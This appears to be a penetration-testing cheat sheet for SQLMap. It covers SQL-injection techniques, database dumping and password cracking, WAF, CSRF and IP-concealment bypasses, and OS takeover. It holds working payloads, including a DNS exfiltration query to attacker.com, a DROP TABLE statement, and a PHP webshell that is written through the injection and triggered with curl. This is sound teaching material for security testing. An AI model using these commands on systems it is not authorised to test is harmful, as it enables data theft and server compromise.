# SQLMap Essentials

## SQLMap Overview

Python tool automating detection and exploitation of SQL injection flaws, maintained since 2006.

```bash
python sqlmap.py -u '<URL>'
```

### SQLMap Installation

```bash
sudo apt install sqlmap # Debian
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev # manual install
python sqlmap.py
```

### Supported SQL Injection Types

Injection types SQLMap detects and exploits, shown via the advanced help switch.

```bash
sqlmap -hh
```

`--technique=TECH` SQL injection techniques to use (default `BEUSTQ`)

`B` boolean-based blind | `E` error-based | `U` union query-based | `S` stacked queries | `T` time-based blind | `Q` inline queries

#### Boolean-based blind SQL Injection

Differentiates TRUE/FALSE responses, roughly 7-8 requests per character, the most common SQLi type.

```sql
AND 1=1
```

#### Error-based SQL Injection

DBMS errors carry query results in the response; faster than every type but UNION, pulling ~200-byte chunks per request.

```sql
AND GTID_SUBSET(@@version,0)
```

#### UNION query-based

Extends the original query so injected results render in the response; the fastest type, sometimes one request per table.

```sql
UNION ALL SELECT 1,@@version,3
```

#### Stacked queries

Piggy-backs an extra statement after the vulnerable one, needed for non-query statements (INSERT/UPDATE/DELETE); requires platform support (MSSQL, PostgreSQL by default).

```sql
; DROP TABLE users
```

#### Time-based blind SQL Injection

Uses response delay instead of content difference for TRUE/FALSE; slower than boolean-based, used when boolean-based can't apply.

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

#### Inline queries

Embeds a query inside the original query; uncommon, needs specific vulnerable app code.

```sql
SELECT (SELECT @@version) from
```

#### Out-of-band SQL Injection

Used when other types are too slow or unsupported; SQLMap exfiltrates via DNS, forcing the target to request attacker-controlled subdomains.

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

## Getting Started with SQLMap

Two help levels: `-h` basic options, `-hh` the full advanced option list.

```bash
sqlmap -h
sqlmap -hh
```

### Basic Scenario

Tests a GET parameter for SQLi and auto-accepts default prompts.

```bash
sqlmap -u "<URL>" --batch
```

`--batch` skip prompts, use default answers

## SQLMap Output Description

Log messages during a scan explain detection progress and confirm the injection type found.

#### URL content is stable

No major response differences across repeated requests, needed to reliably spot SQLi-caused changes.

#### Parameter appears to be dynamic

Value changes affecting the response signal the parameter reaches the database.

#### Parameter might be injectable

Heuristic indicator from a DBMS error on invalid input, not proof of SQLi.

#### Parameter might be vulnerable to XSS attacks

A quick XSS heuristic runs alongside SQLi testing.

#### Back-end DBMS is '...'

Detected DBMS lets SQLMap skip payloads built for other DBMSes.

#### Level/risk values

Offers to run every payload for the detected DBMS instead of only top payloads.

#### Reflective values found

Payload values reflected in the response get filtered out before comparison.

#### Parameter appears to be injectable

A false positive is still possible; SQLMap runs extra logic checks at the end to rule them out.

#### Time-based comparison statistical model

Baseline response times get collected first to statistically catch deliberate delays, even over high latency.

#### Extending UNION query injection technique tests

UNION tests default to ~10 requests per parameter, extended once another technique already succeeds.

#### Technique appears to be usable

ORDER BY heuristic finds the UNION column count via binary search before full payloads run.

#### Parameter is vulnerable

Confirms the parameter is vulnerable and offers to keep testing other parameters.

#### Sqlmap identified injection points

Final listing of confirmed exploitable injection points with type, title, and payload.

#### Data logged to text files

Local path storing logs, session, and output data, reused on later runs to cut requests.

## Running SQLMap on an HTTP Request

Options for setting up the HTTP request before scanning; missing cookies or malformed POST data often block detection.

`--crawl=<DEPTH>` / `--forms` / `-g=<DORK>` auto-find injectable parameters

### Curl Commands

Paste a browser's Copy as cURL output and swap `curl` for `sqlmap` to reuse it verbatim.

### GET/POST Requests

`-u`/`--url` tests GET parameters, `--data` tests POST body parameters.

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test' # mark injection point
```

`-p <PARAM>` test only this parameter

### Full HTTP Requests

Loads a complete captured HTTP request (e.g. from Burp) for complex headers or POST bodies.

```bash
sqlmap -r req.txt
```

Mark the injection point in the request file with `*` (e.g. `/?id=*`)

### Custom SQLMap Requests

Switches for setting individual header values manually instead of a full request file.

```bash
sqlmap -u "<URL>" --cookie='<COOKIE>'
sqlmap -u "<URL>" -H='Cookie:<COOKIE>'
sqlmap -u "<URL>" --data='<DATA>' --method PUT
```

`--random-agent` random browser User-Agent | `--mobile` imitate smartphone UA | `--host` / `--referer` / `-A`,`--user-agent` set those headers

Mark a header value for injection testing with `*` (e.g. `--cookie="id=1*"`)

### Custom HTTP Requests

Also parses JSON and XML formatted POST bodies, in a relaxed, non-strict way.

## Handling SQLMap Errors

Mechanisms for finding and fixing problems when a scan isn't behaving as expected.

### Display Errors

Parses and prints DBMS error messages live during the run.

```bash
sqlmap -u "<URL>" --parse-errors
```

### Store the Traffic

Saves every sent and received HTTP request/response to a file for manual review.

```bash
sqlmap -u "<URL>" --batch -t <OUTPUT_FILE>
```

### Verbose Output

Raises console verbosity, printing full requests and errors live.

```bash
sqlmap -u "<URL>" -v 6 --batch
```

`-v` verbosity 0-6, default 1

### Using Proxy

Routes all traffic through a MITM proxy (e.g. Burp) for manual inspection and replay.

`--proxy=<PROXY_URL>`

## Attack Tuning

Each payload is a vector (the SQL code to run) plus boundaries (prefix/suffix fitting it into the vulnerable statement).

### Prefix/Suffix

Wraps the vector in a custom prefix/suffix for cases the default boundaries don't cover.

```bash
sqlmap -u "<URL>" --prefix="<PREFIX>" --suffix="<SUFFIX>"
```

### Level/Risk

`--level` widens vector/boundary coverage, `--risk` widens vectors by potential harm to the target.

```bash
sqlmap -u "<URL>" --level=<1-5> --risk=<1-3>
sqlmap -u "<URL>" -v 3 --level=5 # show [PAYLOAD] lines used
```

`--level` 1-5, default 1 | `--risk` 1-3, default 1

Gotcha: default (level 1, risk 1) uses up to 72 payloads per parameter, level 5 risk 3 up to 7,865. Raise risk for OR-based payloads (e.g. login pages); OR payloads can trigger DELETE/UPDATE side effects on the target.

#### Status Codes

Fixes TRUE-response detection to one HTTP status code when codes differ between TRUE/FALSE.

`--code=<CODE>` e.g. `--code=200`

#### Titles

Bases TRUE/FALSE comparison on the HTML `<title>` tag content.

`--titles`

#### Strings

Fixes detection on one string that appears only in TRUE responses.

`--string=<STRING>` e.g. `--string=success`

#### Text-only

Strips HTML tags and compares only visible text, cutting noise from hidden tags.

`--text-only`

#### Techniques

Narrows payloads to specific SQLi technique letters, e.g. to skip slow or disruptive ones.

`--technique=<TECH>` e.g. `--technique=BEU` (boolean + error + union only)

#### UNION SQLi Tuning

Manual hints for UNION payloads when auto-detection needs help.

`--union-cols=<N>` exact column count | `--union-char=<CHAR>` replaces default NULL/int filler | `--union-from=<TABLE>` FROM appendix for DBs that require one (e.g. Oracle)

Gotcha: a missing FROM appendix is often SQLMap failing to detect the DBMS name before it's needed.

## Database Enumeration

Lookup and retrieval of available database content, done after confirming the SQLi vulnerability is exploitable.

### SQLMap Data Exfiltration

Predefined per-DBMS queries; `inband` runs for UNION/error-based, `blind` runs row-by-row for blind SQLi.

### Basic DB Data Enumeration

Gathers version banner, current user, current DB, and DBA status right after detection.

```bash
sqlmap -u "<URL>" --banner --current-user --current-db --is-dba
```

`--banner` DB version | `--current-user` | `--current-db` | `--is-dba` check admin rights

Gotcha: a DB `root`/DBA user has no direct relation to the OS root user or OS privileges.

### Table Enumeration

```bash
sqlmap -u "<URL>" --tables -D <DB>
sqlmap -u "<URL>" --dump -T <TABLE> -D <DB>
```

`--dump-format` HTML or SQLite output instead of default CSV

### Table/Row Enumeration

```bash
sqlmap -u "<URL>" --dump -T <TABLE> -D <DB> -C <COLUMN>,<COLUMN_2>
sqlmap -u "<URL>" --dump -T <TABLE> -D <DB> --start=2 --stop=3
```

`-C` limit to specific columns | `--start`/`--stop` limit to a row range

### Conditional Enumeration

```bash
sqlmap -u "<URL>" --dump -T <TABLE> -D <DB> --where="<CONDITION>"
```

### Full DB Enumeration

```bash
sqlmap -u "<URL>" --dump -D <DB>
sqlmap -u "<URL>" --dump-all --exclude-sysdbs
```

`--dump` without `-T` grabs every table in the DB | `--dump-all` grabs every DB | `--exclude-sysdbs` skips system DBs

## Advanced Database Enumeration

Deeper enumeration: schema overview, keyword search across DBs, and password hash cracking.

### DB Schema Enumeration

Retrieves the column structure of every table across all databases.

```bash
sqlmap -u "<URL>" --schema
```

### Searching for Data

Searches database, table, or column names with LIKE across every database.

```bash
sqlmap -u "<URL>" --search -T <TABLE_KEYWORD>
sqlmap -u "<URL>" --search -C <COLUMN_KEYWORD>
```

### Password Enumeration and Cracking

Dumping a table with recognized password hashes auto-prompts a dictionary-based cracking attempt.

```bash
sqlmap -u "<URL>" --dump -D <DB> -T <TABLE>
```

Gotcha: cracking runs multi-process (one per core), supports 31 hash types, bundled dictionary has ~1.4M entries.

### DB Users Password Enumeration and Cracking

Dumps DBMS-level connection credentials instead of application table data.

```bash
sqlmap -u "<URL>" --passwords --batch
```

`--all` with `--batch` runs full enumeration automatically; slow, review output files manually.

## Bypassing Web Application Protections

Mechanisms built into SQLMap for getting past target-side protections that would otherwise block automated exploitation.

### Anti-CSRF Token Bypass

Parses the response for a fresh token value and reuses it on the next request.

```bash
sqlmap -u "<URL>" --data="id=1&csrf-token=<TOKEN>" --csrf-token="csrf-token"
```

Gotcha: a parameter named with `csrf`, `xsrf`, or `token` prompts auto-update even without `--csrf-token`.

### Unique Value Bypass

Randomizes one parameter's value every request, no response parsing needed.

```bash
sqlmap -u "<URL>&rp=<VALUE>" --randomize=rp --batch
```

### Calculated Parameter Bypass

Runs Python code before each request to compute a dependent parameter value.

```bash
sqlmap -u "<URL>&h=<HASH>" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

### IP Address Concealing

Hides or rotates the source IP through a proxy or the Tor network.

```bash
sqlmap -u "<URL>" --proxy="socks4://<PROXY_IP>:<PORT>"
sqlmap -u "<URL>" --proxy-file=<FILE>
sqlmap -u "<URL>" --tor
sqlmap -u "<URL>" --check-tor
```

`--proxy-file` goes sequentially through a proxy list, skips on failure | `--tor` uses the local SOCKS4 proxy at port 9050/9150 | `--check-tor` confirms Tor is in use

Check Tor: https://check.torproject.org/

### WAF Bypass

Sends a malicious-looking payload on a fake parameter first to fingerprint any WAF present (e.g. ModSecurity returns 406).

`--skip-waf` skip the WAF heuristic test (less noise)

### User-agent Blacklisting Bypass

The default sqlmap User-Agent can get blacklisted, causing immediate 5XX errors.

`--random-agent` random browser User-Agent from a large pool

### Tamper Scripts

Python scripts that modify requests before sending, chained in priority order, mostly for WAF/IPS bypass.

```bash
sqlmap -u "<URL>" --tamper=between,randomcase
sqlmap --list-tampers
```

`0eunion` UNION → e0UNION | `base64encode` base64-encodes the payload | `between` `>` → `NOT BETWEEN 0 AND #`, `=` → `BETWEEN # AND #` | `commalesslimit` MySQL `LIMIT M,N` → `LIMIT N OFFSET M` | `equaltolike` `=` → `LIKE` | `halfversionedmorekeywords` MySQL versioned comment before each keyword | `modsecurityversioned` wraps query in MySQL versioned comment | `modsecurityzeroversioned` wraps query in MySQL zero-versioned comment | `percentage` prefixes each char with `%` (MySQL) | `plus2concat` `+` → MsSQL `CONCAT()` | `randomcase` random keyword case | `space2comment` space → `/**/` | `space2dash` space → `--` + random string + newline | `space2hash` MySQL space → `#` + random string + newline | `space2mssqlblank` MsSQL space → random blank char | `space2plus` space → `+` | `space2randomblank` space → random valid blank char | `symboliclogical` `AND`/`OR` → `&&`/`||` | `versionedkeywords` wraps each non-function keyword in MySQL versioned comment | `versionedmorekeywords` wraps every keyword in MySQL versioned comment

### Miscellaneous Bypasses

Two more bypass mechanisms: chunked transfer encoding and HTTP parameter pollution.

`--chunked` splits the POST body into chunks, slips blacklisted keywords past filters

HTTP parameter pollution (HPP) splits a payload across repeated same-named parameters (e.g. `id=1&id=UNION&id=SELECT...`), reassembled by platforms that support it (e.g. ASP).

## OS Exploitation

Uses the SQLi to read/write local files outside the database, and potentially get direct OS command execution.

### File Read/Write

Reading needs MySQL LOAD DATA + INSERT privilege; DBA rights aren't required but often go with file-read access.

```sql
LOAD DATA LOCAL INFILE '<TARGET_FILE>' INTO TABLE <TABLE>
```

#### Checking for DBA Privileges

```bash
sqlmap -u "<URL>" --is-dba
```

#### Reading Local Files

```bash
sqlmap -u "<URL>" --file-read "<TARGET_FILE>"
```

Gotcha: on failed/unreliable retrieval, try `--no-cast` or `--hex`.

#### Writing Local Files

Needs file-write privilege, off by default (e.g. MySQL `--secure-file-priv`), plus OS write access to the target directory.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php # build PHP webshell
sqlmap -u "<URL>" --file-write "shell.php" --file-dest "<TARGET_FILE>" # write it via SQLi
curl "<URL>/shell.php?cmd=<COMMAND>" # trigger RCE
```

### OS Command Execution

Gets an interactive OS shell via SQLi: a written shell, exec-capable SQL functions, or direct-exec queries like MSSQL `xp_cmdshell`.

```bash
sqlmap -u "<URL>" --os-shell
sqlmap -u "<URL>" --os-shell --technique=E
```

Gotcha: UNION-based os-shell can silently return no output; error-based (`--technique=E`) is more likely to return command output.

`--batch` auto-picks the shell language and webroot prompts (e.g. common webroot locations)